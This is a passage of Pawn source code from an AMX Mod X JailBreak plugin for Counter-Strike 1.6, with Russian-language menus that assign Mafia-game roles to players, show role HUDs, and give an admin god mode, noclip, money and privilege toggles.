            new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
            g_Mafia[iTarget] = 1;
            g_Mir[iTarget] = 0;
            set_hudmessage(255, 165, 0, -1.0, 0.60, 0, 6.0, 3.0);
            show_hudmessage(0, "Мафия была назначена...");
            Show_MafiaRoley(id);
        }
    }
    return PLUGIN_HANDLED;
}

Cmd_PlayerKomissar(id) return Show_PlayerKomissar(id, g_iMenuPosition[id] = 0);
Show_PlayerKomissar(id, iPos)
{
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsNotSetBit(g_iBitUserAlive, i) || g_iUserTeam[i] != 1 || g_Mir[i] != 1) continue;
        g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
    case 0:
        {
            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_MafiaRoley(id);
        }
    default: iLen = formatex(szMenu, charsmax(szMenu), "\yВыберите, кого назначить \w[%d|%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_PlayerKomissar");
}

public Handle_PlayerKomissar(id, iKey)
{
    switch(iKey)
    {
    case 8: return Show_PlayerKomissar(id, ++g_iMenuPosition[id]);
    case 9: return Show_PlayerKomissar(id, --g_iMenuPosition[id]);
    default:
        {
            new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
            g_Komissar[iTarget] = 1;
            g_Mir[iTarget] = 0;
            set_hudmessage(255, 165, 0, -1.0, 0.60, 0, 6.0, 3.0);
            show_hudmessage(0, "Комиссар был назначен...");
            Show_MafiaRoley(id);
        }
    }
    return PLUGIN_HANDLED;
}

Cmd_PlayerDoctor(id) return Show_PlayerDoctor(id, g_iMenuPosition[id] = 0);
Show_PlayerDoctor(id, iPos)
{
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsNotSetBit(g_iBitUserAlive, i) || g_iUserTeam[i] != 1 || g_Mir[i] != 1) continue;
        g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
    case 0:
        {
            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_MafiaRoley(id);
        }
    default: iLen = formatex(szMenu, charsmax(szMenu), "\yВыберите, кого назначить \w[%d|%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_PlayerDoctor");
}

public Handle_PlayerDoctor(id, iKey)
{
    switch(iKey)
    {
    case 8: return Show_PlayerDoctor(id, ++g_iMenuPosition[id]);
    case 9: return Show_PlayerDoctor(id, --g_iMenuPosition[id]);
    default:
        {
            new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
            g_Doctor[iTarget] = 1;
            g_Mir[iTarget] = 0;
            set_hudmessage(255, 165, 0, -1.0, 0.60, 0, 6.0, 3.0);
            show_hudmessage(0, "Доктор был назначен...");
            Show_MafiaRoley(id);
        }
    }
    return PLUGIN_HANDLED;
}

Cmd_PlayerManyak(id) return Show_PlayerManyak(id, g_iMenuPosition[id] = 0);
Show_PlayerManyak(id, iPos)
{
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsNotSetBit(g_iBitUserAlive, i) || g_iUserTeam[i] != 1 || g_Mir[i] != 1) continue;
        g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
    case 0:
        {
            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_MafiaRoley(id);
        }
    default: iLen = formatex(szMenu, charsmax(szMenu), "\yВыберите, кого назначить \w[%d|%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_PlayerManyak");
}

public Handle_PlayerManyak(id, iKey)
{
    switch(iKey)
    {
    case 8: return Show_PlayerManyak(id, ++g_iMenuPosition[id]);
    case 9: return Show_PlayerManyak(id, --g_iMenuPosition[id]);
    default:
        {
            new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
            g_Manyak[iTarget] = 1;
            g_Mir[iTarget] = 0;
            set_hudmessage(255, 165, 0, -1.0, 0.60, 0, 6.0, 3.0);
            show_hudmessage(0, "Маньяк был назначен...");
            Show_MafiaRoley(id);
        }
    }
    return PLUGIN_HANDLED;
}

Cmd_PlayerShluxa(id) return Show_PlayerShluxa(id, g_iMenuPosition[id] = 0);
Show_PlayerShluxa(id, iPos)
{
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsNotSetBit(g_iBitUserAlive, i) || g_iUserTeam[i] != 1 || g_Mir[i] != 1) continue;
        g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
    case 0:
        {
            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_MafiaRoley(id);
        }
    default: iLen = formatex(szMenu, charsmax(szMenu), "\yВыберите, кого назначить \w[%d|%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_PlayerShluxa");
}

public Handle_PlayerShluxa(id, iKey)
{
    switch(iKey)
    {
    case 8: return Show_PlayerShluxa(id, ++g_iMenuPosition[id]);
    case 9: return Show_PlayerShluxa(id, --g_iMenuPosition[id]);
    default:
        {
            new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
            g_Shluxa[iTarget] = 1;
            g_Mir[iTarget] = 0;
            set_hudmessage(255, 165, 0, -1.0, 0.60, 0, 6.0, 3.0);
            show_hudmessage(0, "Шлюха была назначена...");
            Show_MafiaRoley(id);
        }
    }
    return PLUGIN_HANDLED;
}

Cmd_RoleyName(id) return Show_RoleyName(id, g_iMenuPosition[id] = 0);
Show_RoleyName(id, iPos)
{
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsNotSetBit(g_iBitUserAlive, i) || g_iUserTeam[i] != 1 || g_Mir[i] == 1) continue;
        g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
    case 0:
        {
            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_MafiaMenu(id);
        }
    default: iLen = formatex(szMenu, charsmax(szMenu), "\yСписок ролей \w[%d|%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        new szNameRoley[128];
        if(g_Mafia[i]) format(szNameRoley, charsmax(szNameRoley), "мафия");
        else if(g_Komissar[i]) format(szNameRoley, charsmax(szNameRoley), "комиссар");
        else if(g_Doctor[i]) format(szNameRoley, charsmax(szNameRoley), "доктор");
        else if(g_Manyak[i]) format(szNameRoley, charsmax(szNameRoley), "маньяк");
        else if(g_Shluxa[i]) format(szNameRoley, charsmax(szNameRoley), "шлюха");
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s - \r%s^n", ++b, szName, szNameRoley);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_RoleyName");
}

public Handle_RoleyName(id, iKey)
{
    switch(iKey)
    {
    case 8: return Show_RoleyName(id, ++g_iMenuPosition[id]);
    case 9: return Show_RoleyName(id, --g_iMenuPosition[id]);
    default:
        {
            new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
            if(g_Mafia[iTarget])
            {
                g_Mafia[iTarget] = 0;
                g_Mir[iTarget] = 1;
                set_hudmessage(0, 150, 255, -1.0, 0.60, 0, 6.0, 3.0);
                show_hudmessage(0, "Один из мафии, был снят.");
            }
            else if(g_Komissar[iTarget])
            {
                g_Komissar[iTarget] = 0;
                g_Mir[iTarget] = 1;
                set_hudmessage(0, 150, 255, -1.0, 0.60, 0, 6.0, 3.0);
                show_hudmessage(0, "Один из комиссаров, был снят.");
            }
            else if(g_Doctor[iTarget])
            {
                g_Doctor[iTarget] = 0;
                g_Mir[iTarget] = 1;
                set_hudmessage(0, 150, 255, -1.0, 0.60, 0, 6.0, 3.0);
                show_hudmessage(0, "Один из докторов, был снят.");
            }
            else if(g_Manyak[iTarget])
            {
                g_Manyak[iTarget] = 0;
                g_Mir[iTarget] = 1;
                set_hudmessage(0, 150, 255, -1.0, 0.60, 0, 6.0, 3.0);
                show_hudmessage(0, "Один из маньяка, был снят.");
            }
            else if(g_Shluxa[iTarget])
            {
                g_Shluxa[iTarget] = 0;
                g_Mir[iTarget] = 1;
                set_hudmessage(0, 150, 255, -1.0, 0.60, 0, 6.0, 3.0);
                show_hudmessage(0, "Одна из шлюх, была снята.");
            }
            Show_MafiaMenu(id);
        }
    }
    return PLUGIN_HANDLED;
}

stock hud_on()
{
    new szPlayers[32];
    new szNum, szPlayer;

    get_players(szPlayers, szNum);

    for(new i; i < szNum; i++)
    {
        szPlayer = szPlayers[i];

        if(!is_user_alive(szPlayer) || !is_user_connected(szPlayer) || g_iUserTeam[szPlayer] != 1)
        continue;
        
        g_Mir[szPlayer] = 1;

        set_task(1.0, "dhud_info", 8888, _, _, "b");
    }
    return PLUGIN_HANDLED;
}

stock mafia_off()
{
    new szPlayers[32];
    new szNum, szPlayer;

    get_players(szPlayers, szNum);

    for(new i; i < szNum; i++)
    {
        szPlayer = szPlayers[i];

        if(!is_user_alive(szPlayer) || !is_user_connected(szPlayer) || g_iUserTeam[szPlayer] != 1)
        continue;
        
        g_Mafia[szPlayer] = 0;
        g_Komissar[szPlayer] = 0;
        g_Doctor[szPlayer] = 0;
        g_Mir[szPlayer] = 0;
        g_Manyak[szPlayer] = 0;
        g_Shluxa[szPlayer] = 0;
        g_ManDay = 0;
        g_ShlDay = 0;
        g_MafiaGame = 0;
        g_DayMafia = 0;
        g_DocDay = 0;
        g_KomDay = 0;
        g_MafiaDay = 0;
    }
	remove_task(8888);
	
    return PLUGIN_HANDLED;
}

public dhud_info()
{
    new szPlayers[32];
    new szNum, szPlayer;

    get_players(szPlayers, szNum);

    for(new i; i < szNum; i++)
    {
        szPlayer = szPlayers[i];

        if(!is_user_alive(szPlayer) || !is_user_connected(szPlayer) || g_iUserTeam[szPlayer] != 1)
        continue;

        if(g_Mafia[szPlayer])
        {
            set_hudmessage(255, 165, 0, 0.0, 0.89, 0, 6.0, 1.0);
            show_hudmessage(szPlayer, "[%s]^n[%s]", Roles_Info[0], Task_Info[0]);            
        }
        else if(g_Komissar[szPlayer])
        {
            set_hudmessage(255, 165, 0, 0.0, 0.89, 0, 6.0, 1.0);
            show_hudmessage(szPlayer, "[%s]^n[%s]", Roles_Info[1], Task_Info[1]);
        }
        else if(g_Doctor[szPlayer])
        {
            set_hudmessage(255, 165, 0, 0.0, 0.89, 0, 6.0, 1.0);
            show_hudmessage(szPlayer, "[%s]^n[%s]", Roles_Info[2], Task_Info[2]);
        }
        else if(g_Manyak[szPlayer])
        {
            set_hudmessage(255, 165, 0, 0.0, 0.89, 0, 6.0, 1.0);
            show_hudmessage(szPlayer, "[%s]^n[%s]", Roles_Info[3], Task_Info[3]);
        }
        else if(g_Shluxa[szPlayer])
        {
            set_hudmessage(255, 165, 0, 0.0, 0.89, 0, 6.0, 1.0);
            show_hudmessage(szPlayer, "[%s]^n[%s]", Roles_Info[4], Task_Info[4]);
        }
        else
        {
            set_hudmessage(255, 165, 0, 0.0, 0.89, 0, 6.0, 1.0);
            show_hudmessage(szPlayer, "[%s]^n[%s]", Roles_Info[5], Task_Info[5]);
        }
    }
    return PLUGIN_HANDLED;
}


public scr_color_fd()
{
    message_begin(MSG_BROADCAST, get_user_msgid("ScreenFade"));
    write_short(1<<12);
    write_short(1<<12);
    write_short(0x0001);
    write_byte(0);
    write_byte(255);
    write_byte(0);
    write_byte(255);
    message_end();
}

public scr_color_fd_end()
{
    message_begin(MSG_BROADCAST, get_user_msgid("ScreenFade"));
    write_short(1<<12);
    write_short(1<<12);
    write_short(0x0001);
    write_byte(0);
    write_byte(0);
    write_byte(0);
    write_byte(0);
    message_end();
}

Show_OvsyankaKrut(id)
{
    jbe_informer_offset_up(id);
    new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), iLen;
    iLen = formatex(szMenu, charsmax(szMenu), "\wМеню Овсянкина [1/1]^n^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wМагазин: %s^n", Blockshop[0] ? "\rЗаблокирован" : "\yРазблокирован");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wБессмертие: %s^n", g_iGodGame[id] ? "\rВыкл" : "\yВкл");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wНоклип: %s^n", g_iNoClip[id] ? "\rВыкл" : "\yВкл");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wПривилегии: %s^n", g_iRejim ? "\rЗаблокирован" : "\yРазблокирован");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wПолёт + Хук: %s^n", g_bHookStatus ? "\rЗапрещён" : "\yРазрешён");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \wГоворить в микро: %s^n^n", g_iSimonVoice ? "\rЗапрещено" : "\yРазрешено");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \wВыдача денег^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \wОбнулить способности \yзеков^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \wДалее");
    formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \wВыход");
    return show_menu(id, iKeys, szMenu, -1, "Show_OvsyankaKrut");
}

public Handle_OvsyankaKrut(id, iKey) 
{
    new szName[32];
    get_user_name(id, szName, charsmax(szName));
	
    switch(iKey)
    { 
        case 0:
        {
            if(!Blockshop[0])
            {
                g_iBlockShop = true;
                Blockshop[0] = true;
            } 
            else 
            {
                g_iBlockShop = false;
                Blockshop[0] = false;
            }
        }
	    case 1: 
		{	
			if(g_iGodGame[id])
			{			
				g_iGodGame[id] = 0;
				set_user_godmode(id, 0);
				UTIL_SayText(0, "%L !tОвсяныч !g%s !tвыключил !gбессмертие", LANG_PLAYER, "JBE_PREFIX", szName);
			}
			else 
			{
				g_iGodGame[id] = 1;
				set_user_godmode(id, 1);
				UTIL_SayText(0, "%L !tОвсяныч !g%s !tвключил !gбессмертие", LANG_PLAYER, "JBE_PREFIX", szName);
			}
		}
		case 2: 
		{	
			if(g_iNoClip[id])
			{			
				g_iNoClip[id] = 0;
				set_user_noclip(id, 0);
				set_user_maxspeed(id, 250.0);
				UTIL_SayText(0, "%L !tОвсяныч !g%s !tвыключил !gноклип", LANG_PLAYER, "JBE_PREFIX", szName);
			}
			else 
			{
				g_iNoClip[id] = 1;
				set_user_noclip(id, 1);
				set_user_maxspeed(id, 400.0);
				UTIL_SayText(0, "%L !tОвсяныч !g%s !tвключил !gноклип", LANG_PLAYER, "JBE_PREFIX", szName);
			}
		}
		case 3: 
		{	
			if(g_iRejim)
			{			
				g_iRejim = 0;
				UTIL_SayText(0, "%L !tОвсяныч !g%s !tвключил все !gпривилегий", LANG_PLAYER, "JBE_PREFIX", szName);
			}
			else 
			{
				g_iRejim = 1;
				UTIL_SayText(0, "%L !tОвсяныч !g%s !tвыключил все !gпривилегий", LANG_PLAYER, "JBE_PREFIX", szName);
			}
		}
		case 4:
		{
			if(!g_bHookStatus)
			{
				UTIL_SayText(0, "%L !tОвсяныч !g%s !tзапретил !gполёт + хук", LANG_PLAYER, "JBE_PREFIX", szName);
				g_bHookStatus = true;
			}
			else 
			{
				UTIL_SayText(0, "%L !tОвсяныч !g%s !tразрешил !gполёт + хук", LANG_PLAYER, "JBE_PREFIX", szName);
				g_bHookStatus = false;
			}
		}
		case 5:
		{
			if(g_iSimonVoice) SimonVoiceOn(id);
			else SimonVoiceOn(id);
		}
        case 6: return Cmd_MoneyGive(id);
		case 7: 
		{	
			for(new i = 1; i<=g_iMaxPlayers; i++) 
			{
				if(g_iUserTeam[i] == 1)
				{
					set_pev(i, pev_gravity, 1.0);
					ClearBit(g_iBitFastRun, i);
			        ExecuteHamB(Ham_Player_ResetMaxSpeed, i);
					ClearBit(g_iBitAutoBhop, i);
			        ClearBit(g_iBitFastRun, i);
					ClearBit(g_iBitGravRun, i);
			        ClearBit(g_iBitDoubleJump, i);
			        ClearBit(g_iBitRandomGlow, i);
			        ClearBit(g_iBitInvisibleHat, i);
			        ClearBit(g_iBitHingJump, i);
					ClearBit(g_iBitDoubleDamage, i);
					ClearBit(g_iBitRandomGlow, i);
				}
			}
			UTIL_SayText(0, "%L !tОвсяныч !g%s !tОбнулил все способности !gзекам", LANG_PLAYER, "JBE_PREFIX", szName);
		}
        case 8: return Show_PrivilegesMenu(id);
        case 9: return PLUGIN_HANDLED;
    }
    return Show_OvsyankaKrut(id);
}

public SimonVoiceOn(id)
{
	if(id != g_iChiefId) UTIL_SayText(id, "%L !tВы не начальник!", LANG_PLAYER, "JBE_PREFIX");
	
	if(id == g_iChiefId && g_iSimonVoice )
	{
		g_iSimonVoice = 0;
		UTIL_SayText(0, "%L !tСупер-саймон !tразрешил говорить !gвсем.", LANG_PLAYER, "JBE_PREFIX");
	}
	else if(id == g_iChiefId && g_iSimonVoice == 0)
	{
		g_iSimonVoice = 1;
		UTIL_SayText(0, "%L !tСупер-саймон !tзапретил говорить !gвсем.", LANG_PLAYER, "JBE_PREFIX");
	}
}

Cmd_MoneyGive(id) return Show_MoneyGive(id, g_iMenuPosition[id] = 0);
Show_MoneyGive(id, iPos)
{
    if(iPos < 0) return PLUGIN_HANDLED;
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(!is_user_connected(i)) continue;
        g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
        case 0:
        {
            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return PLUGIN_HANDLED;
        }
        default: iLen = formatex(szMenu, charsmax(szMenu), "\wВыдача денег [%d/%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s \r$%d^n", ++b, szName, g_iUserMoney[i]);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_MoneyGive");
}

public Handle_MoneyGive(id, iKey)
{
    new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
    switch(iKey)
    {
        case 8: return Show_MoneyGive(id, ++g_iMenuPosition[id]);
        case 9: return Show_MoneyGive(id, --g_iMenuPosition[id]);
        default:
        {
            TargetID[id] = iTarget;
            return num_money_1(id);
        }
    }
    return PLUGIN_HANDLED;
}

Show_MarkerMenu(id)
{
	new szMenu[512],iKeys = (1<<0|1<<1|1<<2|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_MARKER_MENU");
	jbe_informer_offset_up(id);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n^n", id, "JBE_MENU_MARKER_COLOR_MENU");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\d%L^n", id, "JBE_MENU_SETTING_INF");
	switch(szSpriteStyle[id])
	{
		case 0: iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_SPRITE_MODE_0_END");
		case 1: iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_SPRITE_MODE_1_END");
		case 2: iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_SPRITE_MODE_2_END");
	}	
	switch(szPlayerSize[id])
	{
		case 0: iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_SIZE_MODE_0_SIZE");
		case 1: iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_SIZE_MODE_1_SIZE");
		case 2: iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_SIZE_MODE_2_SIZE");
		case 3: iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_SIZE_MODE_3_SIZE");
	}	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_MarkerMenu");
}

public Handle_MarkerMenu(id, iKey)
{
	switch(iKey)
		{	
			case 0: return Show_Colorsmenu(id);
			case 1:
			{
				++szSpriteStyle[id];
				if(szSpriteStyle[id] == 3) 
				szSpriteStyle[id] = 0 ;
			}	
			case 2:
			{
				++szPlayerSize[id];
				if(szPlayerSize[id] == 4) 
